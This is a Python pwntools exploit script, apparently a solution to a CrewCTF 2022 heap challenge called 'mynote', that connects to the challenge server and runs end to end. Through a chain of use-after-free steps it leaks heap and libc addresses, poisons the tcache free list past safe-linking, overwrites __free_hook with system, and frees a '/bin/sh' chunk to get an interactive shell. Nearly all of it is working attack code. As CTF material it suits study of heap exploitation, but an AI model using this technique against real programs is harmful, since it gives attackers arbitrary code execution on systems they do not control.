#!/usr/bin/env python3


from pwn import *


#e = ELF("./mynote")
r = remote("lambang.crewctf-2022.crewc.tf",1337)
libc = ELF("./libc.so.6")
def alloc(index,size,content):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Index:",f"{index}")
    r.sendlineafter(b"Size:",f"{size}")
    r.sendlineafter(b"Content:",content)

def show(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Index:",f"{index}")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak



def move(src,dst):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"(src):",f"{src}")
    r.sendlineafter(b"(dest):",f"{dst}")

def copy(src,dst):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"(src)",f"{src}")
    r.sendlineafter(b"(dest)",f"{dst}")

alloc(0,112,b"A" * 0x20)
move(0,0)
log.info("First UAF to get heap base of the process")
heap_base = show(0) << 12
log.info("The heap base of the process is " + hex(heap_base))
alloc(0,112,b"F" * 0x58 + p64(0xd1))
alloc(1,112,b"G" * 0x20)
alloc(2,112,b"H" * 0x28 + p64(0x51))
alloc(5,112,"Z" * 8)
alloc(3,112,p64(heap_base + 0x10 ^ (heap_base >>12)) + b"F" * 0x50 + p64(0xd1))
move(1,4)
move(5,4)
move(0,0)
copy(3,0)
alloc(0,112,b"A")
alloc(0,112,p64(0) * 2 + p32(0) + p16(0) + p16(0x7))
log.info("Second UAF to tamper the tcache structure to corrupt tcache count")
alloc(0,32,b"A")
alloc(1,32,b"B")
alloc(5,32,b"C")
alloc(3,32,p64(heap_base + 0x300 ^ (heap_base >>12)))
move(1,4)
move(5,4)
move(0,0)
log.info("Third UAF to push a 0xd0 chunk to free list")
copy(3,0)
alloc(3,32,b"D" * 20)
alloc(3,32,b"E" * 20)
move(3,4)
alloc(1,88,b"I" * 0x8)
alloc(1,24,b"J" * 0x8)
alloc(1,24,b"K" * 0x8)
alloc(1,88,b"L" * 8)
log.info("Multiple allocations from 0xd0 unsortedbin to push it into smallbins")
log.info("This small bin leaks libc pointer..The selection of smallbin over unsorted bin is unsortedbin address in 2.32 is null terminated")
libc_base = (show(2) << 8) - 0x1e3c00
log.info("The libc base of the process is " + hex(libc_base))
alloc(0,24,b"M")
alloc(1,24,b"N")
alloc(2,24,b"O")
alloc(3,24,p64((libc_base + libc.sym.__free_hook) ^ ( heap_base >>12)))
move(1,4)
move(2,4)
move(0,0)
log.info("Final UAF to tamper the free_hook with system function address")
copy(3,0)
alloc(1,40,b"/bin/sh\x00")
alloc(0,40,p64(libc_base + libc.sym.system))
move(1,6)
r.interactive()

